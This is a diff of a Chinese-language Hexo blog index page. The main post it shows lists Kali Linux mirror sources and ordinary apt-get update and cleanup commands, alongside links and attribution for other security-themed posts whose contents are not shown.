+<div class="iblue" style="box-sizing:border-box;margin:20px 0px;padding:15px 15px 15px 70px;box-shadow:rgba(0, 0, 0, 0.0980392) 0px 1px 2px;border-radius:5px;border:1px solid #9ACBE8;color:#5D93B2;font-family:'Microsoft Yahei';line-height:25px;white-space:normal;background:url(&quot;"><br>    本文章原创<span style="box-sizing:border-box;">作者：<a href="http://www.hongkediguo.com/author/3" title="大起大落谁都有，拍拍屁股继续走 648053341@qq.com" target="_blank" rel="noopener">无法</a>&nbsp;，</span>转自&nbsp;<a href="http://www.hongkediguo.com/" target="_blank" rel="noopener">中国红客帝国官网-Honker EmPire For China - Powered by H.E.C</a>&nbsp;。<br></div>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/10/intranet_ploit/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-metasploit_cmd" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -324,6 +751,108 @@
 
 
   
+    <article id="post-kail_sourcelist" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/06/kail_sourcelist/">Kail 更新国内源</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/06/kail_sourcelist/" class="archive-article-date">
+  	<time datetime="2018-08-06T03:33:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#中科大<br>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
+<p>#阿里云<br>deb <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
+<p>#清华大学<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p>
+<p>#浙大<br>deb <a href="http://mirrors.zju.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="http://mirrors.zju.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>
+<p>#东软大学<br>deb <a href="http://mirrors.neusoft.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib<br>deb-src <a href="http://mirrors.neusoft.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib</p>
+<p>#官方源<br>deb <a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>
+<p><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy" style="line-height:1.5;"><a title="复制代码" style="color:rgb(7,93,179);border:none;" target="_blank"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></span></div><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy" style="line-height:1.5;"><a title="复制代码" style="color:rgb(7,93,179);border:none;" target="_blank"><br></a></span></div></p>
+<p>保存后之后回到命令行下执行命令：<br>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</p>
+<p>apt-get clean #删除以下载的包</p>
+<p>reboot #重新启动</p>
+<p>这样应该就没问题了</p>
+<p>备注：<br>apt-get常用命令:<br>update – 取回更新的软件包列表信息<br>upgrade – 进行一次升级<br>install – 安装新的软件包(注：软件包名称是 libc6 而非 libc6.deb)<br>remove – 卸载软件包<br>purge – 卸载并清除软件包的配置<br>autoremove – 卸载所有自动安装且不再使用的软件包<br>dist-upgrade – 发布版升级，见 apt-get(8)<br>dselect-upgrade – 根据 dselect 的选择来进行升级<br>build-dep – 为源码包配置所需的编译依赖关系<br>clean – 删除所有已下载的包文件<br>autoclean – 删除已下载的旧包文件<br>check – 核对以确认系统的依赖关系的完整性<br>source – 下载源码包文件<br>download – 下载指定的二进制包到当前目录<br>changelog – 下载指定软件包，并显示其changelog</p>
+<p>保存后之后回到命令行下执行命令：<br>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</p>
+<p>apt-get clean #删除以下载的包</p>
+<p>reboot #重新启动</p>
+<p>这样应该就没问题了</p>
+<p>备注：<br>apt-get常用命令:<br>update – 取回更新的软件包列表信息<br>upgrade – 进行一次升级<br>install – 安装新的软件包(注：软件包名称是 libc6 而非 libc6.deb)<br>remove – 卸载软件包<br>purge – 卸载并清除软件包的配置<br>autoremove – 卸载所有自动安装且不再使用的软件包<br>dist-upgrade – 发布版升级，见 apt-get(8)<br>dselect-upgrade – 根据 dselect 的选择来进行升级<br>build-dep – 为源码包配置所需的编译依赖关系<br>clean – 删除所有已下载的包文件<br>autoclean – 删除已下载的旧包文件<br>check – 核对以确认系统的依赖关系的完整性<br>source – 下载源码包文件<br>download – 下载指定的二进制包到当前目录</p>
+<p>changelog – 下载指定软件包，并显示其changelog</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/06/kail_sourcelist/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-metasploit" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -446,108 +975,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/08/06/metasploit/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-kail_sourcelist" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/06/kail_sourcelist/">Kail 更新国内源</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/06/kail_sourcelist/" class="archive-article-date">
-  	<time datetime="2018-08-06T03:33:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#中科大<br>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
-<p>#阿里云<br>deb <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
-<p>#清华大学<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p>
-<p>#浙大<br>deb <a href="http://mirrors.zju.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="http://mirrors.zju.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>
-<p>#东软大学<br>deb <a href="http://mirrors.neusoft.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib<br>deb-src <a href="http://mirrors.neusoft.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib</p>
-<p>#官方源<br>deb <a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>
-<p><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy" style="line-height:1.5;"><a title="复制代码" style="color:rgb(7,93,179);border:none;" target="_blank"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></span></div><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy" style="line-height:1.5;"><a title="复制代码" style="color:rgb(7,93,179);border:none;" target="_blank"><br></a></span></div></p>
-<p>保存后之后回到命令行下执行命令：<br>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</p>
-<p>apt-get clean #删除以下载的包</p>
-<p>reboot #重新启动</p>
-<p>这样应该就没问题了</p>
-<p>备注：<br>apt-get常用命令:<br>update – 取回更新的软件包列表信息<br>upgrade – 进行一次升级<br>install – 安装新的软件包(注：软件包名称是 libc6 而非 libc6.deb)<br>remove – 卸载软件包<br>purge – 卸载并清除软件包的配置<br>autoremove – 卸载所有自动安装且不再使用的软件包<br>dist-upgrade – 发布版升级，见 apt-get(8)<br>dselect-upgrade – 根据 dselect 的选择来进行升级<br>build-dep – 为源码包配置所需的编译依赖关系<br>clean – 删除所有已下载的包文件<br>autoclean – 删除已下载的旧包文件<br>check – 核对以确认系统的依赖关系的完整性<br>source – 下载源码包文件<br>download – 下载指定的二进制包到当前目录<br>changelog – 下载指定软件包，并显示其changelog</p>
-<p>保存后之后回到命令行下执行命令：<br>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</p>
-<p>apt-get clean #删除以下载的包</p>
-<p>reboot #重新启动</p>
-<p>这样应该就没问题了</p>
-<p>备注：<br>apt-get常用命令:<br>update – 取回更新的软件包列表信息<br>upgrade – 进行一次升级<br>install – 安装新的软件包(注：软件包名称是 libc6 而非 libc6.deb)<br>remove – 卸载软件包<br>purge – 卸载并清除软件包的配置<br>autoremove – 卸载所有自动安装且不再使用的软件包<br>dist-upgrade – 发布版升级，见 apt-get(8)<br>dselect-upgrade – 根据 dselect 的选择来进行升级<br>build-dep – 为源码包配置所需的编译依赖关系<br>clean – 删除所有已下载的包文件<br>autoclean – 删除已下载的旧包文件<br>check – 核对以确认系统的依赖关系的完整性<br>source – 下载源码包文件<br>download – 下载指定的二进制包到当前目录</p>
-<p>changelog – 下载指定软件包，并显示其changelog</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/06/kail_sourcelist/">展开全文 >></a>
         </p>
       
 
